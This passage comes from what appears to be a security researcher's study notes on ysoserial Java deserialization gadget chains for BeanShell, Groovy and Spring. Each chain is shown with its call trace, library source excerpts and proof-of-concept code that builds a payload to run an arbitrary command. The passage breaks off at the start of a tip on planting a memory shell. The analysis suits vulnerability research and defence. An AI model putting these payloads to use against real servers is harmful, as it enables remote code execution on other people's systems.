JDK1.8<br>org.beanshell:bsh:2.0b5 (fixed in 2.0b6)</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Gadget chain:</span></span><br><span class="line">invokeMethod:<span class="number">233</span>, This (bsh)</span><br><span class="line">invokeMethod:<span class="number">174</span>, This (bsh)</span><br><span class="line">invokeImpl:<span class="number">194</span>, XThis$Handler (bsh)</span><br><span class="line">invoke:<span class="number">131</span>, XThis$Handler (bsh)</span><br><span class="line">compare:-<span class="number">1</span>, $Proxy5 (com.sun.proxy)</span><br><span class="line">siftDownUsingComparator:<span class="number">721</span>, PriorityQueue (java.util)</span><br><span class="line">siftDown:<span class="number">687</span>, PriorityQueue (java.util)</span><br><span class="line">heapify:<span class="number">736</span>, PriorityQueue (java.util)</span><br><span class="line">readObject:<span class="number">796</span>, PriorityQueue (java.util)</span><br></pre></td></tr></table></figure><p>Firstly, let’s take a glance into <code>bsh.XThis</code>. It has a member named by <code>invocationHandler</code> with <code>XThis$Handler</code> type. <code>Handler</code> implements <code>InvocationHandler</code> interface and delegates methods invocation request to the method with the same signature in current namespace. To check this, step into <code>This.invokeMethod()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invokeMethod</span><span class="params">(   </span></span><br><span class="line"><span class="params">   String methodName, Object [] args,   </span></span><br><span class="line"><span class="params">Interpreter interpreter, CallStack callstack, SimpleNode callerInfo,   </span></span><br><span class="line"><span class="params"><span class="type">boolean</span> declaredOnly  )</span>   </span><br><span class="line">   <span class="keyword">throws</span> EvalError  </span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">Class [] types = Types.getTypes( args );  </span><br><span class="line"><span class="type">BshMethod</span> <span class="variable">bshMethod</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line">   bshMethod = namespace.getMethod( methodName, types, declaredOnly );  </span><br><span class="line">&#125; <span class="keyword">catch</span> ( UtilEvalError e ) &#123;  </span><br><span class="line">   <span class="comment">// leave null  </span></span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> ( bshMethod != <span class="literal">null</span> )  </span><br><span class="line">   <span class="keyword">return</span> bshMethod.invoke( args, interpreter, callstack, callerInfo );</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This means that we can extract the <code>invocationHandler</code> of a <code>XThis</code> object and build a proxy on it. When a method like <code>compare()</code> is invoked on this proxy, it would result in the invocation of the bsh method <code>compare()</code> defined in current namespace. And the <code>invocationHandler</code> does not require any modification. What we should do is to define a <code>compare()</code> method by bsh interpreter.</p><p>Poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> BeanShellUtil.makeBeanShellPayload(command);  </span><br><span class="line"><span class="comment">// payload: compare(Object su18, Object su19) &#123;new java.lang.ProcessBuilder(new String[]&#123;&quot;calc.exe&quot;&#125;</span></span><br><span class="line"><span class="type">Interpreter</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Interpreter</span>();  </span><br><span class="line">Reflections.getMethodAndInvoke(i, <span class="string">&quot;setu&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Object.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;bsh.cwd&quot;</span>, <span class="string">&quot;.&quot;</span>&#125;);  </span><br><span class="line">i.eval(payload);  </span><br><span class="line"><span class="type">XThis</span> <span class="variable">xt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XThis</span>(i.getNameSpace(), i);  </span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) Reflections.getField(xt.getClass(), <span class="string">&quot;invocationHandler&quot;</span>).get(xt);  </span><br><span class="line">Comparator&lt;? <span class="built_in">super</span> Object&gt; comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Comparator.class&#125;, handler);  </span><br><span class="line">PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);  </span><br><span class="line">Object[] queue = &#123;Integer.valueOf(<span class="number">1</span>), Integer.valueOf(<span class="number">1</span>)&#125;;  </span><br><span class="line">Reflections.setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, queue);  </span><br><span class="line">Reflections.setFieldValue(priorityQueue, <span class="string">&quot;size&quot;</span>, Integer.valueOf(<span class="number">2</span>));  </span><br><span class="line"><span class="keyword">return</span> priorityQueue;</span><br></pre></td></tr></table></figure><h2 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h2><blockquote><p>[!NOTE] pre-requirements<br>Reproduced on JDK1.8<br>org.codehaus.groovy:groovy:2.3.9</p></blockquote><p>This gadget can use both <code>AnnotationInvocationHandler</code> or <code>PriorityQueue</code>, we use the later as example.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Gadget chain:</span></span><br><span class="line">execute:<span class="number">530</span>, ProcessGroovyMethods (org.codehaus.groovy.runtime)</span><br><span class="line">doMethodInvoke:-<span class="number">1</span>, dgm$<span class="number">748</span> (org.codehaus.groovy.runtime)</span><br><span class="line">invokeMethod:<span class="number">1207</span>, MetaClassImpl (groovy.lang)</span><br><span class="line">invokeMethod:<span class="number">1074</span>, MetaClassImpl (groovy.lang)</span><br><span class="line">invokeMethod:<span class="number">1016</span>, MetaClassImpl (groovy.lang)</span><br><span class="line">call:<span class="number">423</span>, Closure (groovy.lang)</span><br><span class="line">invokeCustom:<span class="number">51</span>, ConvertedClosure (org.codehaus.groovy.runtime)</span><br><span class="line">invoke:<span class="number">103</span>, ConversionHandler (org.codehaus.groovy.runtime)</span><br><span class="line">entrySet:-<span class="number">1</span>, $Proxy4 (com.sun.proxy)</span><br><span class="line">readObject:<span class="number">452</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br></pre></td></tr></table></figure><p>Poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">ConvertedClosure</span> <span class="variable">closure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConvertedClosure</span>(<span class="keyword">new</span> <span class="title class_">MethodClosure</span>(command, <span class="string">&quot;execute&quot;</span>), <span class="string">&quot;entrySet&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> Gadgets.createProxy(closure, Map.class);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(map);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">return</span> handler;</span><br></pre></td></tr></table></figure><p>The <code>ConvertedClosure</code> class is an <code>InvocationHandler</code> bounded to a single method, i.e. only if its bounded method can be invoked. And the invocation can be delegated to another <code>Closure</code>(here is <code>MethodClosure</code>).<br>Step into its super class <code>ConversionHandler</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;  </span><br><span class="line">    <span class="type">VMPlugin</span> <span class="variable">plugin</span> <span class="operator">=</span> VMPluginFactory.getPlugin();  </span><br><span class="line">    <span class="keyword">if</span> (plugin.getVersion()&gt;=<span class="number">7</span> &amp;&amp; isDefaultMethod(method)) &#123;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">handle</span> <span class="operator">=</span> handleCache.get(method);  </span><br><span class="line">        <span class="keyword">if</span> (handle == <span class="literal">null</span>) &#123;  </span><br><span class="line">            handle = plugin.getInvokeSpecialHandle(method, proxy);  </span><br><span class="line">            handleCache.put(method, handle);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> plugin.invokeHandle(handle, args);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!checkMethod(method)) &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="keyword">return</span> invokeCustom(proxy, method, args);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (GroovyRuntimeException gre) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> ScriptBytecodeAdapter.unwrap(gre);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>, args);  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ite) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> ite.getTargetException();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We should make control dive into <code>invokeCustom()</code>.<br>Look at <code>ConvertedClosure</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invokeCustom</span><span class="params">(Object proxy, Method method, Object[] args)</span>  </span><br><span class="line"><span class="keyword">throws</span> Throwable &#123;  </span><br><span class="line">    <span class="keyword">if</span> (methodName!=<span class="literal">null</span> &amp;&amp; !methodName.equals(method.getName())) <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    <span class="keyword">return</span> ((Closure) getDelegate()).call(args);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In <code>MethodClosure</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">doCall</span><span class="params">(Object arguments)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> InvokerHelper.invokeMethod(getOwner(), method, arguments);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Finally, in <code>ProcessGroovyMethods</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Process <span class="title function_">execute</span><span class="params">(<span class="keyword">final</span> String self)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">    <span class="keyword">return</span> Runtime.getRuntime().exec(self);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So the whole procedure is:<br>deserialize <code>AnnotationInvocationHandler</code>  &#x3D;&gt;<br><code>entrySet()</code> is called upon <code>ConvertedClosure</code> &#x3D;&gt;<br>delegate to <code>MethodClosure</code> &#x3D;&gt;<br>call groovy integrated method <code>execute()</code></p><p>End.</p><h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><h3 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h3><blockquote><p>[!NOTE] pre-requirements<br>JDK1.7<br>org.springframework:spring-core:4.1.4.RELEASE</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Gadget chain:</span></span><br><span class="line"></span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()</span><br><span class="line">SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">HashMap.get()</span><br><span class="line">ReflectionUtils.findMethod()</span><br><span class="line">SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">HashMap.get()</span><br><span class="line">ReflectionUtils.invokeMethod()</span><br><span class="line">Method.invoke()</span><br><span class="line">Templates(Proxy).newTransformer()</span><br><span class="line">AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()</span><br><span class="line">ObjectFactory(Proxy).getObject()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">HashMap.get()</span><br><span class="line">Method.invoke()</span><br><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">TemplatesImpl.getTransletInstance()</span><br><span class="line">TemplatesImpl.defineTransletClasses()</span><br><span class="line">TemplatesImpl.TransletClassLoader.defineClass()</span><br><span class="line">Pwner*(Javassist-generated).&lt;<span class="keyword">static</span> init&gt;</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h4 id="AnnotationInvocationHandler-special-functionality"><a href="#AnnotationInvocationHandler-special-functionality" class="headerlink" title="AnnotationInvocationHandler special functionality"></a>AnnotationInvocationHandler special functionality</h4><p>The <code>AnnotationInvocationHandler</code> class is able to overwrite a proxied method, return the designated value when call it. We can look at its <code>invoke()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">...</span><br><span class="line"><span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And <code>memberValues</code> is built within <code>readObject()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span>  </span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    ...</span><br><span class="line">    Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(<span class="string">&quot;memberValues&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span><br><span class="line">    ...</span><br><span class="line">    mv.put(name, value);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">UnsafeAccessor.setMemberValues(<span class="built_in">this</span>, mv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>There is an constraint that the type of <code>memberValues</code> should equals to that of the return type of the method to be hooked.</p><h4 id="Kick-off-MethodInvokeTypeProvider"><a href="#Kick-off-MethodInvokeTypeProvider" class="headerlink" title="Kick-off : MethodInvokeTypeProvider"></a>Kick-off : MethodInvokeTypeProvider</h4><p><code>MethodInvokeTypeProvider</code> class is an inner class of <code>org.springframework.core.SerializableTypeWrapper</code>. In its <code>readObject()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream inputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">   inputStream.defaultReadObject();  </span><br><span class="line">   <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ReflectionUtils.findMethod(<span class="built_in">this</span>.provider.getType().getClass(), <span class="built_in">this</span>.methodName);  </span><br><span class="line">   <span class="built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="built_in">this</span>.provider.getType());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>If we can control <code>methodName</code> and <code>provider.getType()</code>, then we can execute any code.<br>By using the measure introduced [[Java Deserialize Vulnerabilities ysoserial study#AnnotationInvocationHandler special functionality|here]], we can hook <code>getType()</code> to return an object in <code>Type</code> class. It is expected to get a <code>TemplatesImpl</code> when call <code>getType()</code> and invoke its <code>newTransformer()</code>. So we need to introduce <code>ObjectFactoryDelegatingInvocationHandler</code>.</p><h4 id="ObjectFactoryDelegatingInvocationHandler"><a href="#ObjectFactoryDelegatingInvocationHandler" class="headerlink" title="ObjectFactoryDelegatingInvocationHandler"></a>ObjectFactoryDelegatingInvocationHandler</h4><p>It is an inner class of <code>org.springframework.beans.factory.support.AutowireUtils</code>. It is an <code>InvocationHandler</code>. Let’s look at its <code>invoke()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();  </span><br><span class="line">    <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;equals&quot;</span>)) &#123;  </span><br><span class="line">        <span class="keyword">return</span> proxy == args[<span class="number">0</span>];  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;  </span><br><span class="line">        <span class="keyword">return</span> System.identityHashCode(proxy);  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;toString&quot;</span>)) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.objectFactory.toString();  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.objectFactory.getObject(), args);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> var6.getTargetException();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The invocation will be delegated to the object returned by <code>objectFactory</code>. We can create an <code>ObjectFactory</code> proxy and hook <code>getObject()</code> method for returning <code>TemplatesImpl</code>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">final</span> <span class="type">ObjectFactory</span> <span class="variable">objectFactoryProxy</span> <span class="operator">=</span>  </span><br><span class="line">      Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="string">&quot;getObject&quot;</span>, templates), ObjectFactory.class);</span><br></pre></td></tr></table></figure><p>Equip <code>ObjectFactoryDelegatingInvocationHandler</code> with this <code>ObjectFactory</code> and create a <code>Type</code> proxy:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Type</span> <span class="variable">typeTemplatesProxy</span> <span class="operator">=</span> Gadgets.createProxy((InvocationHandler)  </span><br><span class="line">      Reflections.getFirstCtor(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>)  </span><br><span class="line">         .newInstance(objectFactoryProxy), Type.class, Templates.class);</span><br></pre></td></tr></table></figure><p>Build <code>TypeProvider</code> proxy to hook <code>getType()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">typeProviderProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(  </span><br><span class="line">      Gadgets.createMap(<span class="string">&quot;getType&quot;</span>, typeTemplatesProxy),  </span><br><span class="line">      forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>));</span><br></pre></td></tr></table></figure><p>Build <code>MethodInvokeTypeProvider</code> and modify <code>methodName</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Constructor</span> <span class="variable">mitpCtor</span> <span class="operator">=</span> Reflections.getFirstCtor(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);  </span><br><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">mitp</span> <span class="operator">=</span> mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod(<span class="string">&quot;getClass&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;&#125;), <span class="number">0</span>);  </span><br><span class="line">Reflections.setFieldValue(mitp, <span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> nitp;</span><br></pre></td></tr></table></figure><p>Whole Poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">final</span> <span class="type">ObjectFactory</span> <span class="variable">objectFactoryProxy</span> <span class="operator">=</span>  </span><br><span class="line">      Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="string">&quot;getObject&quot;</span>, templates), ObjectFactory.class);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">final</span> <span class="type">Type</span> <span class="variable">typeTemplatesProxy</span> <span class="operator">=</span> Gadgets.createProxy((InvocationHandler)  </span><br><span class="line">      Reflections.getFirstCtor(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>)  </span><br><span class="line">         .newInstance(objectFactoryProxy), Type.class, Templates.class);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">typeProviderProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(  </span><br><span class="line">      Gadgets.createMap(<span class="string">&quot;getType&quot;</span>, typeTemplatesProxy),  </span><br><span class="line">      forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>));  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">final</span> <span class="type">Constructor</span> <span class="variable">mitpCtor</span> <span class="operator">=</span> Reflections.getFirstCtor(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);  </span><br><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">mitp</span> <span class="operator">=</span> mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod(<span class="string">&quot;getClass&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;&#125;), <span class="number">0</span>);  </span><br><span class="line">Reflections.setFieldValue(mitp, <span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">return</span> mitp;</span><br></pre></td></tr></table></figure><h3 id="Spring3"><a href="#Spring3" class="headerlink" title="Spring3"></a>Spring3</h3><blockquote><p>[!NOTE] pre-requirements<br>Reproduced on JDK1.8<br>org.springframework:spring-tx:5.2.3.RELEASE<br>org.springframework:spring-context:5.2.3.RELEASE<br>javax.transaction:javax.transaction-api:1.2</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Gadget chain</span></span><br><span class="line">lookup:<span class="number">179</span>, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookupUserTransaction:<span class="number">571</span>, JtaTransactionManager (org.springframework.transaction.jta)</span><br><span class="line">initUserTransactionAndTransactionManager:<span class="number">448</span>, JtaTransactionManager (org.springframework.transaction.jta)</span><br><span class="line">readObject:<span class="number">1206</span>, JtaTransactionManager (org.springframework.transaction.jta)</span><br></pre></td></tr></table></figure><p><code>JtaTransactionManager</code> class will look up JNDI URL stored in <code>userTransactionName</code> when deserializing.<br>This vul is quite simple without needing to analyze.<br>Poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jndiURL</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line"><span class="keyword">if</span> (command.toLowerCase().startsWith(<span class="string">&quot;jndi:&quot;</span>)) &#123;  </span><br><span class="line">   jndiURL = command.substring(<span class="number">5</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">JtaTransactionManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JtaTransactionManager</span>();  </span><br><span class="line">manager.setUserTransactionName(jndiURL);  </span><br><span class="line"><span class="keyword">return</span> manager;</span><br></pre></td></tr></table></figure><hr><h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><h2 id="Insert-memory-shell-through-deserialization-vulnerability"><a href="#Insert-memory-shell-through-deserialization-vulnerability" class="headerlink" title="Insert memory shell through deserialization vulnerability"></a>Insert memory shell through deserialization vulnerability</h2><ol><li>Create a memory shell class(e.g. <code>EvilFilter</code>) and override the required 